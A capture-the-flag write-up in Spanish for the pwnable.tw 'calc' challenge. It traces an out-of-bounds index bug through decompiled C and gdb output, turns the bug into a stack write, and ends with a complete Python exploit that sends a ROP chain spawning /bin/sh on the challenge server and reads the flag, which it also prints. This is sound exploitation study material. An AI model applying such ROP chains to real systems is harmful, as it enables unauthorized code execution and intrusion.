# calc
```
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No

calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped
```

El programa es una calculadora que implementa algo que parecido al [algoritmo Shunting-Yard](https://en.wikipedia.org/wiki/Shunting_yard_algorithm). Tiene varios bugs pero el más importante es aquel que intenta realizar una operacion aritmética binaria cuando falta uno de los dos operandos:
```
=== Welcome to SECPROG calculator ===
-3
0
-4
0
-5
-3582824
-6
-3582420
```

El programa usa un índice "idx" para revisar la variable "pool", que contiene los resultados de los cálculos:
``` C
void calc(void)
{
  int iVar1;
  int in_GS_OFFSET;
  int idx;
  undefined4 pool [100];
  undefined expression_buf [1024];
  int canary;
  
  canary = *(int *)(in_GS_OFFSET + 0x14);
  while( true ) {
    bzero(expression_buf,0x400);
    iVar1 = get_expr(expression_buf,0x400);
    if (iVar1 == 0) break;
    init_pool(&idx);
                    /* vulnerabilidad en index */
    iVar1 = parse_expr(expression_buf,&idx);
    if (iVar1 != 0) {
      printf("%d\n",pool[idx + -1]);
      fflush((FILE *)stdout);
    }
  }
}
```

Al finalizar `parse_expr`, idx deberia ser 1, de tal forma que `pool[0]` contiene el resultado final del cálculo. Sin embargo al escribir algo como `-10` 0 `+67` intenta evaluarlos con un primer operando vacío. Este comportamiento acaba sobreescribiendo idx. Podemos conseguir leaks del stack y del programa pero no son necesarios para la explotación.

Lo destacable es que lo que sea que pongamos después de esta expresión se escribe en la dirección de memoria a la que apunta `idx`!
```
=== Welcome to SECPROG calculator ===
-8+1094795585

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
```

Nuestra primitiva de escritura arbitraria en el stack es: `-/+IDX+VALUE`, que se traduce en `pool[idx] = value`.

En el ejemplo anterior sobreescribí la direccion de retorno de `parse_expr`. Esta zona es demasiado volátil para la idea de una ROPchain en el stack. Así que mejor opté por la direccion de retorno de `calc` a `main`. 
```
0xffffc8ec ◂:  0x41414141 ('AAAA')
0xffffceac : ▸ 0x8049499 (main+71) ◂:  mov dword ptr [esp], 0x80bf842
pwndbg> distance  0xffffceac 0xffffc8ec
0xffffceac->0xffffc8ec is -0x5c0 bytes (-0x170 words)
pwndbg> p/d 0x5c0 / 4
$1 = 368
```

La cadena se debe escribir a la inversa, comenzando por el último gadget porque hacerlo normalmente hace que el programa intente hacer cálculos con las direcciones adyacentes. No investigué el por qué a profundidad pero creo que al contener estas direcciones valores de la pila como '0xff...' y ceros, ambos son descargados por esta comprobación en `parse_expr`.
```
      /* only positive numbers to the stack? */
      iVar2 = atoi(token_chunk);
      if (0 < iVar2) {
        iVar1 = *idx;
        *idx = iVar1 + 1;
        idx[iVar1 + 1] = iVar2;
      }
```

El binario está enlazado estáticamente, contiene gadgets suficientes para ejecutar la syscall `execve(/bin/sh,NULL,NULL)`.

```py
import socket

# return to main idx: 368
def calc(idx,address):
    p = f"+{idx}+{address}\n"
    print(p,end="")
    s.send(p.encode())
    s.recv(256)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("chall.pwnable.tw",10100))
print(s.recv(1024))

# bss section: 0x80eb060
payload = []
# save '/bin/sh' in .bss section
payload.append(0x080701aa)   # pop edx ; ret
payload.append(0x80eb060)    # destiny
payload.append(0x0805c34b)   # pop eax ; ret
payload.append(0x6e69622f)     # '/bin'
payload.append(0x0809b30d)   # mov dword ptr [edx], eax ; ret
payload.append(0x080701aa)   # pop edx ; ret
payload.append(0x80eb060+4)  # destiny
payload.append(0x0805c34b)   # pop eax ; ret
payload.append(0x68732f)     # '/sh'
payload.append(0x0809b30d)   # mov dword ptr [edx], eax ; ret

# execve('/bin/sh\x00',NULL,NULL)
payload.append(0x080701d1)   # pop ecx ; pop ebx ; ret
payload.append(1)            # ecx + 1
payload.append(0x80eb060)    # ebx
payload.append(0x0806f4eb)   # dec ecx ; ret
payload.append(0x080701aa)   # pop edx ; ret
payload.append(1)            # edx + 1
payload.append(0x080e72e3)   # dec edx ; ret
payload.append(0x0805c34b)   # pop eax ; ret
payload.append(0x0b)         # __NR_execve
payload.append(0x08049a21)   # int 0x80

payload.reverse()
num = len(payload) - 1
for i,address in enumerate(payload):
    calc(368 + num - i,address)
s.send(b"\ncat /home/calc/flag\n")
print(s.recv(1024).decode())
```

`FLAG{C:\Windows\System32\calc.exe}`
